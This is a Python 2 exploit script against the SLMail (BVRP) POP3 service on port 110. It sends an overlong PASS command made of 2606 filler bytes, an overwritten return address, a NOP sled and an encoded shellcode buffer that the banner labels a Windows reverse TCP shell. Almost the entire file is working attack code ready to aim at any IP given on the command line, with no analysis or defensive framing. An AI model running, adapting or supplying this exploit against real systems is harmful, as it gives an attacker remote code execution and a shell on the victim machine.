################################################
# $Id: bvrppop3.py 2019-11-30 00:00 @SrV1n11 $ #
################################################

###############
# This file is an exploit for the POP3 service by BVRP software
# and has compatibility with Windows Service Pack 3 (checked) | Linux (not checked)
##############

import socket,sys

BANNER="""
#####################################################
#   / __ ) |  / / __ \/ __ \ |  / /  _/ | / /  _/  _/
#  / __  | | / / /_/ / /_/ / | / // //  |/ // / / /
# / /_/ /| |/ / _, _/ ____/| |/ // // /|  // /_/ /
#/_____/ |___/_/ |_/_/     |___/___/_/ |_/___/___/
#####################################################

Buffer Reverse TCP Shell - BVRP POP3 SLMAIL
Compatibility: Windows Service Pack 3
--------------------------------------
-Social Networks-
LinkedIn: linkedin.com/in/eric-vinicius-b9a833132/
Email: vinicius.s.rocha46@gmail.com
--------------------------------------
"""

##
# Function to get host via argv[1] ---------------
# Start of buf windows_reverse_tcp code	---------|--
# Start socket host with port 110 ---------------|-|-----------------
# Sending windows_reverse_tcp shell to EBX ------|-|----------------|--
##					    	 | |		    | |
#					    	 | |		    | |
try: # 						 | |		    | |
	sys.argv[1] #<============================ |		    | |
except: #			                   |		    | |
	print BANNER #				   |		    | |
	print "Usage: "+sys.argv[0]+" 0.0.0.0" #   |		    | |
	exit() #				   |		    | |
#  						   |		    | |
buf =  b"" #<=======================================		    | |
buf += b"\xd9\xca\xd9\x74\x24\xf4\xb8\x49\x92\x9e\x2f\x5e\x2b" #    | |
buf += b"\xc9\xb1\x52\x31\x46\x17\x83\xc6\x04\x03\x0f\x81\x7c" #    | |
buf += b"\xda\x73\x4d\x02\x25\x8b\x8e\x63\xaf\x6e\xbf\xa3\xcb" #    | |
buf += b"\xfb\x90\x13\x9f\xa9\x1c\xdf\xcd\x59\x96\xad\xd9\x6e" #    | |
buf += b"\x1f\x1b\x3c\x41\xa0\x30\x7c\xc0\x22\x4b\x51\x22\x1a" #    | |
buf += b"\x84\xa4\x23\x5b\xf9\x45\x71\x34\x75\xfb\x65\x31\xc3" #    | |
buf += b"\xc0\x0e\x09\xc5\x40\xf3\xda\xe4\x61\xa2\x51\xbf\xa1" #    | |
buf += b"\x45\xb5\xcb\xeb\x5d\xda\xf6\xa2\xd6\x28\x8c\x34\x3e" #    | |
buf += b"\x61\x6d\x9a\x7f\x4d\x9c\xe2\xb8\x6a\x7f\x91\xb0\x88" #    | |
buf += b"\x02\xa2\x07\xf2\xd8\x27\x93\x54\xaa\x90\x7f\x64\x7f" #    | |
buf += b"\x46\xf4\x6a\x34\x0c\x52\x6f\xcb\xc1\xe9\x8b\x40\xe4" #    | |
buf += b"\x3d\x1a\x12\xc3\x99\x46\xc0\x6a\xb8\x22\xa7\x93\xda" #    | |
buf += b"\x8c\x18\x36\x91\x21\x4c\x4b\xf8\x2d\xa1\x66\x02\xae" #    | |
buf += b"\xad\xf1\x71\x9c\x72\xaa\x1d\xac\xfb\x74\xda\xd3\xd1" #    | |
buf += b"\xc1\x74\x2a\xda\x31\x5d\xe9\x8e\x61\xf5\xd8\xae\xe9" #    | |
buf += b"\x05\xe4\x7a\xbd\x55\x4a\xd5\x7e\x05\x2a\x85\x16\x4f" #    | |
buf += b"\xa5\xfa\x07\x70\x6f\x93\xa2\x8b\xf8\x5c\x9a\x93\x9d" #    | |
buf += b"\x34\xd9\x93\x5c\x7e\x54\x75\x34\x90\x31\x2e\xa1\x09" #    | |
buf += b"\x18\xa4\x50\xd5\xb6\xc1\x53\x5d\x35\x36\x1d\x96\x30" #    | |
buf += b"\x24\xca\x56\x0f\x16\x5d\x68\xa5\x3e\x01\xfb\x22\xbe" #    | |
buf += b"\x4c\xe0\xfc\xe9\x19\xd6\xf4\x7f\xb4\x41\xaf\x9d\x45" #    | |
buf += b"\x17\x88\x25\x92\xe4\x17\xa4\x57\x50\x3c\xb6\xa1\x59" #    | |
buf += b"\x78\xe2\x7d\x0c\xd6\x5c\x38\xe6\x98\x36\x92\x55\x73" #    | |
buf += b"\xde\x63\x96\x44\x98\x6b\xf3\x32\x44\xdd\xaa\x02\x7b" #    | |
buf += b"\xd2\x3a\x83\x04\x0e\xdb\x6c\xdf\x8a\xfb\x8e\xf5\xe6" #    | |
buf += b"\x93\x16\x9c\x4a\xfe\xa8\x4b\x88\x07\x2b\x79\x71\xfc" #    | |
buf += b"\x33\x08\x74\xb8\xf3\xe1\x04\xd1\x91\x05\xba\xd2\xb3" #    | |
bytes = "A" * 2606 + "\x5b\x9a\xb5\x76" + "\x90" * (390-351) + buf #| |
try: #								    | |
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #     | |
	s.connect((sys.argv[1],110)) #<============================== |
	r = s.recv(1024) #					      |
	print r #						      |
#								      |
	s.send("USER test\r\n") #				      |
	r = s.recv(1024) #     					      |
	print r #					              |
#								      |
	s.send("PASS "+bytes+"\r\n") #<================================
	r = s.recv(1024)
	print r

	s.send("QUIT\r\n")
	r = s.recv(1024)
	print r
except:
	print "Connection Error " + sys.argv[1]
